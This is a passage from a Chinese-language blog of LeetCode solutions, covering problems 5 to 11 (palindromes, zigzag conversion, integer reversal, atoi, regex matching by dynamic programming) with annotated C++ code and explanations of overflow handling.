class="number">-1</span>;</span><br><span class="line">            <span class="type">int</span> r=i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;=s.<span class="built_in">size</span>() &amp;&amp; s[l]==s[r])<span class="comment">//出界或字符不匹配退出循环</span></span><br><span class="line">            &#123;</span><br><span class="line">                l--;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(res.<span class="built_in">size</span>()&lt;r-l<span class="number">-1</span>) res=s.<span class="built_in">substr</span>(l+<span class="number">1</span>,r-l<span class="number">-1</span>);<span class="comment">//储存最长回文串</span></span><br><span class="line">            <span class="comment">//偶数回文串</span></span><br><span class="line">            l=i;</span><br><span class="line">            r=i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;=s.<span class="built_in">size</span>() &amp;&amp; s[l]==s[r])</span><br><span class="line">            &#123;</span><br><span class="line">                l--;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(res.<span class="built_in">size</span>()&lt;r-l<span class="number">-1</span>) res=s.<span class="built_in">substr</span>(l+<span class="number">1</span>,r-l<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6-n-字形变换"><a href="https://leetcode.cn/problems/zigzag-conversion/">6. N 字形变换</a></h2><p>样例：<code>s=PAYPALISHIRING numRows=3</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br><span class="line"></span><br><span class="line"># PAHNAPLSIIGYIR</span><br></pre></td></tr></table></figure><p>本质即为找规律，第一行和最后一行可看成一个等差数列，中间行可看为两个等差数列，注意首项和公差之间的规律即可（注意当n==1，公差为0会进入死循环，需要特殊判断）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1          11          21          31</span><br><span class="line">2       10 12       20 22       30 32</span><br><span class="line">3     9    13     19   23     29   33</span><br><span class="line">4   8      14   18     24   28     34</span><br><span class="line">5 7        15 17       25 27       35</span><br><span class="line">6          16          26          36</span><br></pre></td></tr></table></figure><p>以数字字符串为例，便于找到规律。所有等差数列公差为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2n-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>，除第一行与最后一行，两等差数列首项之差为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi><mo>−</mo><mn>2</mn><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">2n-2-i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>（i为行头元素）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convert</span><span class="params">(string s, <span class="type">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        string res;<span class="comment">//保存结果</span></span><br><span class="line">        <span class="keyword">if</span>(numRows==<span class="number">1</span>) <span class="keyword">return</span> s;<span class="comment">//特殊判断</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numRows;i++)<span class="comment">//遍历每行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>||i==numRows<span class="number">-1</span>)<span class="comment">//首行或末行</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;s.<span class="built_in">size</span>();j+=<span class="number">2</span>*numRows<span class="number">-2</span>)<span class="comment">//等差数列</span></span><br><span class="line">                &#123;</span><br><span class="line">                    res+=s[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//两个等差数列首项j、k</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=i,k=<span class="number">2</span>*numRows<span class="number">-2</span>-i;j&lt;s.<span class="built_in">size</span>()||k&lt;s.<span class="built_in">size</span>();j+=<span class="number">2</span>*numRows<span class="number">-2</span>,k+=<span class="number">2</span>*numRows<span class="number">-2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(j&lt;s.<span class="built_in">size</span>()) res+=s[j];<span class="comment">//注意顺序</span></span><br><span class="line">                    <span class="keyword">if</span>(k&lt;s.<span class="built_in">size</span>()) res+=s[k];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7-整数反转"><a href="https://leetcode.cn/problems/reverse-integer/">7. 整数反转</a></h2><blockquote><p>注意题目要求：如果反转后整数超过 32 位的有符号整数的范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mo>−</mo><msup><mn>2</mn><mn>3</mn></msup><mn>1</mn><mo separator="true">,</mo><msup><mn>2</mn><mn>3</mn></msup><mn>1</mn><mo>−</mo><mn>1</mn><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[-2^31,2^31-1\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span> ，就返回 0。</p><p>假设环境不允许存储 64 位整数（有符号或无符号）。即不使用longlong类型存放数据</p></blockquote><p>将数据存入字符串中，用字符串内置方法可过，这里用数学方法</p><p>基本思路：思路非常简单，每次通过模10运算取出最后一位与上次保留结果的十倍相加（秦九韶算法），此方法对负数依然成立，根本原因为C++中的取模运算与数学中不同，负数取模仍返回负数，这对我们的算法有利</p><p>不限制longlong型：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reverse</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> r=<span class="number">0</span>;<span class="comment">//保存结果，初始值为0</span></span><br><span class="line">        <span class="keyword">while</span>(x)</span><br><span class="line">        &#123;</span><br><span class="line">            r=r*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(r&gt;INT_MAX) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//INT_MAX为常量，int型最大值</span></span><br><span class="line">        <span class="keyword">if</span>(r&lt;INT_MIN) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果限制只能使用<code>int</code>类型存储的话，我们要再循环内判断是否超过范围。假设<code>r</code>为正数时，想判断<code>10*r+x%10&gt;INT_MAX</code>，直接判断会爆int，我们根据数学方法变形为<code>r&gt;((INT_MAX-x%10))/10</code>即可，负数同理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reverse</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> r=<span class="number">0</span>;<span class="comment">//保存结果，初始值为0</span></span><br><span class="line">        <span class="keyword">while</span>(x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(r&gt;<span class="number">0</span>&amp;&amp;r&gt;(INT_MAX-x%<span class="number">10</span>)/<span class="number">10</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(r&lt;<span class="number">0</span>&amp;&amp;r&lt;(INT_MIN-x%<span class="number">10</span>)/<span class="number">10</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            r=r*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-字符串转换整数-atoi"><a href="https://leetcode.cn/problems/string-to-integer-atoi/">8. 字符串转换整数 (atoi)</a></h2><p>典型的模拟题，需要自己模拟<code>atoi</code>函数，这题要求很多，按需求一步一步来</p><p>思路比较常规，和上一题一样（秦九韶算法），一位位读取即可</p><p>不限制<code>long long</code>类型的写法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">myAtoi</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> k=<span class="number">0</span>;<span class="comment">//用来记录当前遍历到字符串元素的下表</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]==<span class="string">&#x27; &#x27;</span>) k++;<span class="comment">//去除字符串前面的空格</span></span><br><span class="line">        <span class="keyword">if</span>(k==s.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//特殊判断，防止字符串仅包含空格或为空，导致越界</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minus =<span class="number">1</span>;<span class="comment">//保存符号，默认为正</span></span><br><span class="line">        <span class="keyword">if</span>(s[k]==<span class="string">&#x27;-&#x27;</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            minus=<span class="number">-1</span>;<span class="comment">//更改符号</span></span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[k]==<span class="string">&#x27;+&#x27;</span>) k++;</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res=<span class="number">0</span>;<span class="comment">//储存结果</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;s[k]&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="comment">//储存数据</span></span><br><span class="line">        &#123;</span><br><span class="line">            res=res*<span class="number">10</span>+(s[k]-<span class="string">&#x27;0&#x27;</span>);<span class="comment">//秦九韶算法</span></span><br><span class="line">            k++;</span><br><span class="line">            <span class="keyword">if</span>(res&gt;INT_MAX) <span class="keyword">break</span>;<span class="comment">//越界提前退出循环，防止爆long long</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res *= minus;<span class="comment">//带上符号</span></span><br><span class="line">        <span class="keyword">if</span>(res&gt;INT_MAX) <span class="keyword">return</span> INT_MAX;<span class="comment">//判断是否越界</span></span><br><span class="line">        <span class="keyword">if</span>(res&lt;INT_MIN) <span class="keyword">return</span> INT_MIN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果限制只能使用<code>int</code>类型，我们只需要在存数时改变越界的判断即可，这里有一个<strong>坑</strong>点，在while循环中我们存放的是整数的绝对值，而int类型的最小值为<code>-2147483648</code>，最大值为<code>2147483647</code>，这就导致恰好为最小值时我们无法将其绝对值存入，需要特殊判断</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">myAtoi</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> k=<span class="number">0</span>;<span class="comment">//用来记录当前遍历到字符串元素的下表</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]==<span class="string">&#x27; &#x27;</span>) k++;<span class="comment">//去除字符串前面的空格</span></span><br><span class="line">        <span class="keyword">if</span>(k==s.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//特殊判断，防止字符串仅包含空格或为空，导致越界</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minus =<span class="number">1</span>;<span class="comment">//保存符号，默认为正</span></span><br><span class="line">        <span class="keyword">if</span>(s[k]==<span class="string">&#x27;-&#x27;</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            minus=<span class="number">-1</span>;<span class="comment">//更改符号</span></span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[k]==<span class="string">&#x27;+&#x27;</span>) k++;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;<span class="comment">//储存结果</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;s[k]&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="comment">//储存数据</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(minus&gt;<span class="number">0</span>&amp;&amp;res&gt;(INT_MAX-(s[k]-<span class="string">&#x27;0&#x27;</span>))/<span class="number">10</span>) <span class="keyword">return</span> INT_MAX;<span class="comment">//正数越界判断</span></span><br><span class="line">            <span class="keyword">if</span>(minus&lt;<span class="number">0</span>&amp;&amp;-res&lt;(INT_MIN+(s[k]-<span class="string">&#x27;0&#x27;</span>))/<span class="number">10</span>) <span class="keyword">return</span> INT_MIN;</span><br><span class="line">            <span class="keyword">if</span>(-res*<span class="number">10</span>-(s[k]-<span class="string">&#x27;0&#x27;</span>)==INT_MIN) <span class="keyword">return</span> INT_MIN;<span class="comment">//特殊判断最小值</span></span><br><span class="line">            res=res*<span class="number">10</span>+(s[k]-<span class="string">&#x27;0&#x27;</span>);<span class="comment">//秦九韶算法</span></span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res *= minus;<span class="comment">//带上符号</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="9-回文数"><a href="https://leetcode.cn/problems/palindrome-number/">9. 回文数</a></h2><p>简单题做法很多</p><p><strong>转换成字符串</strong>：看反转后与之前是否相同（<code>rbegin()</code>、<code>rend()</code>反向迭代器）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        string s=<span class="built_in">to_string</span>(x);<span class="comment">//转化为字符串</span></span><br><span class="line">        <span class="keyword">return</span> s==<span class="built_in">string</span>(s.<span class="built_in">rbegin</span>(),s.<span class="built_in">rend</span>());<span class="comment">//反转看与原串是否相等</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>或者可以用第七题中整数反转思想反转（负数可直接特判为<code>false</code>）</p><h2 id="10-正则表达式匹配-困难"><a href="https://leetcode.cn/problems/regular-expression-matching/">10. 正则表达式匹配</a>（困难）</h2><p>很喜欢一条评论——这不仅是我刷的第十道题，也是我人生中的一道坎</p><p>这种两个字符串匹配的问题通常可以使用DP（动态规划来解决），我们来分析一下，两个字符串的DP问题我们通常用二维数组存储</p><p><img src="https://s2.loli.net/2023/09/25/71B4ekO9jqJspDT.png" alt="图嫖的其他题解"></p><blockquote><p>注意：本题中<code>*</code>代表匹配零个或多个前面的那一个元素，和正常的正则语法不同，这里看了半天😈</p></blockquote><p>时间复杂度分析：这里按照图中黑字的状态转移方程，更新状态时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，枚举<code>*</code>匹配的字符个数时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，总时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，需要进行优化</p><p>我们可以列出<code>f(i-1,j)</code>的状态转移方程，发现其中的共用部分，用其状态来更新<code>f(i,j)</code>的状态，可将枚举阶段的时间复杂度优化为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，最终状态方程如以上红字（优化方式类似于完全背包）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>(), m = p.<span class="built_in">size</span>();</span><br><span class="line">        s = <span class="string">&#x27; &#x27;</span> + s, p = <span class="string">&#x27; &#x27;</span> + p; <span class="comment">//使字符串下标从1开始</span></span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt; (m + <span class="number">1</span>));<span class="comment">//创建二维数组</span></span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;<span class="comment">//初始化状态</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i ++) <span class="comment">//f(0,j)可能成功匹配，i从0开始</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)<span class="comment">//f(i,0)无意义</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// if (j + 1 &lt;= m &amp;&amp; p[j + 1] == &#x27;*&#x27;) continue;</span></span><br><span class="line">                <span class="keyword">if</span> (i &amp;&amp; p[j] != <span class="string">&#x27;*&#x27;</span>) <span class="comment">//状态转移需要用到i - 1, 所以需要保证i &gt; 0</span></span><br><span class="line">                &#123;</span><br><span class="line">                    f[i][j] = f[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; (s[i] == p[j] || p[j] == <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (p[j] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    f[i][j] = f[i][j - <span class="number">2</span>] ||(i &amp;&amp; f[i - <span class="number">1</span>][j] &amp;&amp; (s[i] == p[j - <span class="number">1</span>] || p[j - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f[n][m];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// a***abc是谁整出来的测试用例???? </span></span><br></pre></td></tr></table></figure><h1>Week2</h1><h2 id="11-盛最多水的容器"><a href="https://leetcode.cn/problems/container-with-most-water/">11. 盛最多水的容器</a></h2><p>这道题没找到合适的算法可以解决orz，暴力遍历时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，看了大佬的题解可以用单调栈+二分达到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mo><mi>log</mi><mo>⁡</mo></mo><mrow></mrow></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log_{}{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord 